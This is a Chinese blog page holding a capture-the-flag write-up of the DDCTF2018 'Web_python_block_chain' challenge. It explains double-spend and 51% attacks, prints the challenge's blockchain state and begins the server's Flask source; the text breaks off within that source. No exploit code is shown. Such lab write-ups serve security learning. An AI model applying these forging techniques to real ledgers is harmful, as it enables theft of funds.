@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/HeadPortrait-32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/HeadPortrait-16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://www.xianfish.xyz').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="0x01 Web_python_block_chain在攻防世界题目复现里没有提示，大佬的wp写的很详细，直接抄了，没接触过区块链 https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-区块链/ 题目提示: 某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过">
+<meta name="keywords" content="CTFWEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界WEB">
+<meta property="og:url" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/index.html">
+<meta property="og:site_name" content="Hi~">
+<meta property="og:description" content="0x01 Web_python_block_chain在攻防世界题目复现里没有提示，大佬的wp写的很详细，直接抄了，没接触过区块链 https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-区块链/ 题目提示: 某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/1.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/2.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/3.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/4.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/5.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/6.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/7.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/8.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/9.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/10.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/11.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/12.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/13.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/14.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/15.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/16.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/17.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/18.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/19.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/20.png">
+<meta property="og:image" content="file:///C:/Users/我叫黄~1/AppData/Local/Temp/msohtmlclip1/01/clip_image021.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/22.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/23.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/24.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/25.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/26.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/27.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/28.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/29.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/30.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/123.jpg">
+<meta property="og:updated_time" content="2020-01-11T09:45:40.043Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="攻防世界WEB">
+<meta name="twitter:description" content="0x01 Web_python_block_chain在攻防世界题目复现里没有提示，大佬的wp写的很详细，直接抄了，没接触过区块链 https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-区块链/ 题目提示: 某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过">
+<meta name="twitter:image" content="http://www.xianfish.xyz/2020/01/11/攻防世界web/1.png">
+
+<link rel="canonical" href="http://www.xianfish.xyz/2020/01/11/攻防世界web/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>攻防世界WEB | Hi~</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hi~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">人生总有各种理由将一个人变成一个five!</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://www.xianfish.xyz/2020/01/11/攻防世界web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/HeadPortrait.png">
+      <meta itemprop="name" content="瑟瑟发抖咸鱼黄">
+      <meta itemprop="description" content="您看！工具人啥都不配拥有!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hi~">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          攻防世界WEB
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-01-11 15:53:49 / Modified: 17:45:40" itemprop="dateCreated datePublished" datetime="2020-01-11T15:53:49+08:00">2020-01-11</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="0x01-Web-python-block-chain"><a href="#0x01-Web-python-block-chain" class="headerlink" title="0x01 Web_python_block_chain"></a>0x01 Web_python_block_chain</h2><p>在攻防世界题目复现里没有提示，大佬的wp写的很详细，直接抄了，没接触过区块链</p>
+<p><a href="https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-区块链/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-区块链/</a></p>
+<p>题目提示: 某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过程。不幸的是，该银行被黑客入侵，私钥被窃取，维持区块链正常运转的矿机也全部宕机。现在，你能追回所有DDCoins，并且从商店购买2颗钻石么？</p>
+<p>注意事项：区块链是存在cookie里的，可能会因为区块链太长，浏览器不接受服务器返回的set-cookie字段而导致区块链无法更新，因此强烈推荐写脚本发请求</p>
+<h4 id="双花攻击"><a href="#双花攻击" class="headerlink" title="双花攻击"></a>双花攻击</h4><p>在比特币网络里，你有多少钱，不是你说了算，而是大家说了算，每个人都是公证人。”基于算力证明进行维护的比特币网络一直以来有一个重大的理论风险：如果有人掌握了巨大的计算资源（超过全网过半的算力），他就可以通过强大的算力篡改区块链上的账本，从而控制整个共识网络。这也被称为51%攻击，虽然这种攻击发生的可能性不是很大（掌握这种算力的人本身就可以通过挖矿获得巨大受益，再去冒险篡改账本很容易暴露自身）。仍然是理论上看：一旦这种攻击被发现，比特币网络其他终端可以联合起来对已知的区块链进行硬分叉，全体否认非法的交易。</p>
+<p><a href="http://www.8btc.com/51attack" target="_blank" rel="noopener">51%攻击解析</a></p>
+<p><a href="https://www.zhihu.com/question/39948446" target="_blank" rel="noopener">比特币是如何防范双花的?</a></p>
+<h4 id="区块链基础知识"><a href="#区块链基础知识" class="headerlink" title="区块链基础知识"></a>区块链基础知识</h4><p>关于区块链的一些基础知识，单独有博客，所以这里就没有了</p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>页面打开，是一系列json数据</p>
+<p><img src="/2020/01/11/攻防世界web/1.png" alt="1"></p>
+<p>将代码格式化：</p>
+<p>代码格式化站点：<a href="https://www.html.cn/tool/js_beautify/" target="_blank" rel="noopener">https://www.html.cn/tool/js_beautify/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">hash of genesis block: 8cfb0301000286c266a3d29d78c498ade17556412afcf7135e842ffa127d735f</span><br><span class="line">the bank&apos;s addr: 8f6eb934cceca2dede3b315f04d0f445c518f29a02cce8f3656b9fb0a75eed62a2ac4dd13866a6b6d87ca89b0d9ae9bd, </span><br><span class="line">the hacker&apos;s addr: f7a1e95baf45e7d0a0f636b5fc786b5c3e9056a7a3092225edd017baf1768afedc484f6b6ffc1f90971d87c459a4a4ef, </span><br><span class="line">the shop&apos;s addr: ab87c82cff6cf5233aba04d83a12cbc77a6540e5715506a087b9a193e4f11679da75076335210c93b1e64486d6535221</span><br><span class="line">Balance of all addresses: &#123;  &quot;ab87c82cff6cf5233aba04d83a12cbc77a6540e5715506a087b9a193e4f11679da75076335210c93b1e64486d6535221&quot;: 0,   &quot;8f6eb934cceca2dede3b315f04d0f445c518f29a02cce8f3656b9fb0a75eed62a2ac4dd13866a6b6d87ca89b0d9ae9bd&quot;: 1,   &quot;f7a1e95baf45e7d0a0f636b5fc786b5c3e9056a7a3092225edd017baf1768afedc484f6b6ffc1f90971d87c459a4a4ef&quot;: 999999</span><br><span class="line">  &#125;</span><br><span class="line">All utxos: &#123;</span><br><span class="line">  &quot;77d972a7-cc90-439a-bc77-594744c89ee7&quot;: &#123;</span><br><span class="line">    &quot;amount&quot;: 999999, </span><br><span class="line">    &quot;hash&quot;: &quot;3ff39c9b8b306f9c1bf0787911bf47ebd28d60c2fbe17904b1e51c3980c0cc3a&quot;, </span><br><span class="line">    &quot;addr&quot;: &quot;f7a1e95baf45e7d0a0f636b5fc786b5c3e9056a7a3092225edd017baf1768afedc484f6b6ffc1f90971d87c459a4a4ef&quot;, </span><br><span class="line">    &quot;id&quot;: &quot;77d972a7-cc90-439a-bc77-594744c89ee7&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">  &quot;ef68b7d9-4f69-40a5-a90c-f6fefdf5e635&quot;: &#123;</span><br><span class="line">    &quot;amount&quot;: 1, </span><br><span class="line">    &quot;hash&quot;: &quot;c711176969c028d475e412e52995df80fe9b10ea1f13962a0e4ef78caf63453b&quot;, </span><br><span class="line">    &quot;addr&quot;: &quot;8f6eb934cceca2dede3b315f04d0f445c518f29a02cce8f3656b9fb0a75eed62a2ac4dd13866a6b6d87ca89b0d9ae9bd&quot;, </span><br><span class="line">    &quot;id&quot;: &quot;ef68b7d9-4f69-40a5-a90c-f6fefdf5e635&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">Blockchain Explorer: &#123;</span><br><span class="line">  &quot;4aecfdc138e39e386cf2aad65bd950d59a742121cf874ff1cb8c036a87816980&quot;: &#123;</span><br><span class="line">    &quot;nonce&quot;: &quot;HAHA, I AM THE BANK NOW!&quot;,</span><br><span class="line">    &quot;prev&quot;: &quot;8cfb0301000286c266a3d29d78c498ade17556412afcf7135e842ffa127d735f&quot;, </span><br><span class="line">    &quot;hash&quot;: &quot;4aecfdc138e39e386cf2aad65bd950d59a742121cf874ff1cb8c036a87816980&quot;, </span><br><span class="line">    &quot;transactions&quot;: [&#123;</span><br><span class="line">      &quot;input&quot;: [&quot;79172010-b080-4ad9-b8b2-ba72c232da20&quot;], </span><br><span class="line">      &quot;signature&quot;: [&quot;2afcf49a14934bb070b10aa687e3a209c55bacbe318e30300234779e837f012ec97de502872ab058f1070614ec4fd87b&quot;], </span><br><span class="line">      &quot;hash&quot;: &quot;ce7a7f0a48cc3cc9266227726ce7b7c9fcd90734f86c765f9a24b2040f1bdc9e&quot;, </span><br><span class="line">     &quot;output&quot;: [&#123;&quot;amount&quot;: 999999, &quot;hash&quot;: &quot;3ff39c9b8b306f9c1bf0787911bf47ebd28d60c2fbe17904b1e51c3980c0cc3a&quot;, </span><br><span class="line">      &quot;addr&quot;: &quot;f7a1e95baf45e7d0a0f636b5fc786b5c3e9056a7a3092225edd017baf1768afedc484f6b6ffc1f90971d87c459a4a4ef&quot;, </span><br><span class="line">      &quot;id&quot;: &quot;77d972a7-cc90-439a-bc77-594744c89ee7&quot;</span><br><span class="line">      &#125;, &#123;</span><br><span class="line">      &quot;amount&quot;: 1, </span><br><span class="line">      &quot;hash&quot;: &quot;c711176969c028d475e412e52995df80fe9b10ea1f13962a0e4ef78caf63453b&quot;, </span><br><span class="line">      &quot;addr&quot;: &quot;8f6eb934cceca2dede3b315f04d0f445c518f29a02cce8f3656b9fb0a75eed62a2ac4dd13866a6b6d87ca89b0d9ae9bd&quot;, </span><br><span class="line">      &quot;id&quot;: &quot;ef68b7d9-4f69-40a5-a90c-f6fefdf5e635&quot;</span><br><span class="line">      &#125;]</span><br><span class="line">    &#125;], </span><br><span class="line">    &quot;height&quot;: 1</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;8cfb0301000286c266a3d29d78c498ade17556412afcf7135e842ffa127d735f&quot;: &#123;</span><br><span class="line">    &quot;nonce&quot;: &quot;The Times 03/Jan/2009 Chancellor on brink of second bailout for bank&quot;, </span><br><span class="line">    &quot;prev&quot;: &quot;0000000000000000000000000000000000000000000000000000000000000000&quot;, </span><br><span class="line">    &quot;hash&quot;: &quot;8cfb0301000286c266a3d29d78c498ade17556412afcf7135e842ffa127d735f&quot;, </span><br><span class="line">    &quot;transactions&quot;: [&#123;</span><br><span class="line">      &quot;input&quot;: [], </span><br><span class="line">      &quot;signature&quot;: [], </span><br><span class="line">      &quot;hash&quot;: &quot;f95a2030b476c14e790b1b5560aa158111cf06d891d04c6cd942bd2b273201a1&quot;, </span><br><span class="line">      &quot;output&quot;: [&#123;</span><br><span class="line">        &quot;amount&quot;: 1000000, </span><br><span class="line">        &quot;hash&quot;: &quot;d5e5cd514d2b5cf6cccb19d2253f115c39e8e71ea0f5cc1f9dc259219ecf3f82&quot;, </span><br><span class="line">        &quot;addr&quot;: &quot;8f6eb934cceca2dede3b315f04d0f445c518f29a02cce8f3656b9fb0a75eed62a2ac4dd13866a6b6d87ca89b0d9ae9bd&quot;, </span><br><span class="line">        &quot;id&quot;: &quot;79172010-b080-4ad9-b8b2-ba72c232da20&quot;</span><br><span class="line">        &#125;]</span><br><span class="line">      &#125;], </span><br><span class="line">      &quot;height&quot;: 0</span><br><span class="line">    &#125;, </span><br><span class="line">    &quot;b47ac88e263795044afb5f92e62cc8fc659def91c158de5c13d70b6e127c8074&quot;: &#123;</span><br><span class="line">      &quot;nonce&quot;: &quot;a empty block&quot;, </span><br><span class="line">      &quot;prev&quot;: &quot;4aecfdc138e39e386cf2aad65bd950d59a742121cf874ff1cb8c036a87816980&quot;, </span><br><span class="line">      &quot;hash&quot;: &quot;b47ac88e263795044afb5f92e62cc8fc659def91c158de5c13d70b6e127c8074&quot;, </span><br><span class="line">      &quot;transactions&quot;: [], </span><br><span class="line">      &quot;height&quot;: 2</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>再打开python源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8 </span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib, json, rsa, uuid, os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</span><br><span class="line"><span class="keyword">from</span> pycallgraph <span class="keyword">import</span> PyCallGraph  </span><br><span class="line"><span class="keyword">from</span> pycallgraph <span class="keyword">import</span> Config  </span><br><span class="line"><span class="keyword">from</span> pycallgraph.output <span class="keyword">import</span> GraphvizOutput </span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span></span><br><span class="line">url_prefix = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Here is your flag: DDCTF&#123;******************&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(hashlib.md5(x).digest()).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_reducer</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hash(hash(x)+hash(y))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_attrs</span><span class="params">(d, attrs)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(d) != type(&#123;&#125;): <span class="keyword">raise</span> Exception(<span class="string">"Input should be a dict/JSON"</span>)</span><br><span class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> attrs:</span><br><span class="line">        <span class="keyword">if</span> attr <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"&#123;&#125; should be presented in the input"</span>.format(attr))</span><br><span class="line"></span><br><span class="line">EMPTY_HASH = <span class="string">'0'</span>*<span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr_to_pubkey</span><span class="params">(address)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> rsa.PublicKey(int(address, <span class="number">16</span>), <span class="number">65537</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pubkey_to_address</span><span class="params">(pubkey)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> pubkey.e == <span class="number">65537</span></span><br><span class="line">    